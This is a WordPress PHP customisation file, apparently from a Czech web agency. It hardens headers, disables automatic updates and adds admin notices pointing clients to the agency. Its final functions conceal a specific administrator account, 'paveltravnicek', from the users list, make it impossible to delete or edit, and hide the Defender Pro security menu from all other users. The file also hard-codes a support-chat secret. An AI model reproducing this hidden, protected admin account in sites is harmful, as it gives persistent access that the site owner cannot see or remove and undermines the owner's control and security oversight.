<?php

define('DISALLOW_FILE_EDIT', true);

remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'wp_oembed_add_discovery_links');
remove_action('wp_head', 'wp_shortlink_wp_head');
add_filter('emoji_svg_url', '__return_false');

add_filter('auto_update_core', '__return_false'); 
add_filter('auto_update_plugin', '__return_false'); 
add_filter('auto_update_theme', '__return_false'); 

add_action('all_admin_notices', function() {
    $updates = get_site_transient('update_plugins');
    if (!empty($updates->response)) {
        $ignore_plugin = 'webtoffee-gdpr-cookie-consent/webtoffee-gdpr-cookie-consent.php';
        $updates_needed = false;
        foreach ($updates->response as $plugin_file => $plugin_data) {
            if ($plugin_file !== $ignore_plugin) {
                $updates_needed = true;
                break;
            }
        }
        if ($updates_needed) {
            echo '<div style="border: 1px solid #F6C6CA; border-radius: 5px; background-color: #F9D7DA; color: #721C23; padding: 15px; margin: 20px 20px 20px 0px; font-size: 16px;">
        <strong>Váš redakční systém nebo některé z jeho součástí nejsou aktuální.</strong> 
        <br>Obraťte se prosím na <a href="https://smart-websites.cz/kontakt/" target="_blank" style="color: #721C23; text-decoration: underline;">správce Vašich webových stránek</a>.
    </div>';
        }
    }
});

add_action('all_admin_notices', function() {
    if (function_exists('pico_get_parent_theme_version') && pico_get_parent_theme_version() < 3.0) {
        echo '<div style="border: 1px solid #F6C6CA; border-radius: 5px; background-color: #F9D7DA; color: #721C23; padding: 15px; margin: 20px 20px 20px 0px; font-size: 16px;">
            <strong>Vámi použitá šablona vyžaduje aktualizaci rodičovské šablony.</strong>
            <br>Obraťte se prosím na <a href="https://smart-websites.cz/kontakt/" target="_blank" style="color: #721C23; text-decoration: underline;">správce Vašich webových stránek</a>.
        </div>';
    }
});

add_filter('rest_authentication_errors', function($result) {
    if (!is_user_logged_in()) {
        return new WP_Error('rest_forbidden', 'REST API is restricted to authenticated users.', array('status' => 401));
    }
    return $result;
});

add_action('admin_footer', 'vlozit_script_do_zapati_administrace');

function vlozit_script_do_zapati_administrace() {
    $povolene_domeny = [
        'smart-websites.cz'
    ];

    $aktualni_domena = $_SERVER['HTTP_HOST'];

    if (!in_array($aktualni_domena, $povolene_domeny)) {
        return;
    }

    ?>
    <script type="text/javascript">
        var supportBoxChatId = 2781;
        var supportBoxChatSecret = 'ba9d4c68795805e1987db16bc7f3b1ae';
        var supportBoxChatVariables = {
            email: 'client@email.tld',
            fullName: 'John Doe',
            phone: '123456789',
            customerId: 12345
        };
    </script>
    <script src="https://chat.supportbox.cz/web-chat/entry-point" async defer></script>
    <?php
}

add_action('admin_footer', 'vlozit_script_do_zapati_administrace');

function hide_specific_admin_menu_items() {
    if (!is_admin()) {
        return;
    }
    
    $current_user = wp_get_current_user();
    
    if ($current_user->user_login !== 'paveltravnicek') {
        remove_menu_page('branding'); // Branda Pro
        remove_menu_page('wp-defender'); // Defender Pro
    }
}
add_action('admin_menu', 'hide_specific_admin_menu_items', 999);

function protect_paveltravnicek($allcaps, $caps, $args) {
    $user = wp_get_current_user();
    if (isset($args[2]) && $args[2] == get_user_by('login', 'paveltravnicek')->ID) {
        if (in_array($args[0], ['delete_users', 'remove_users', 'edit_users'])) {
            $allcaps[$args[0]] = false;
        }
    }
    return $allcaps;
}
add_filter('user_has_cap', 'protect_paveltravnicek', 10, 3);

function hide_paveltravnicek_from_users_list($query) {
    global $pagenow;
    $current_user = wp_get_current_user();
    if ($pagenow === 'users.php' && $current_user->user_login !== 'paveltravnicek') {
        $query->query_where .= " AND user_login != 'paveltravnicek'";
    }
}
add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');

?>
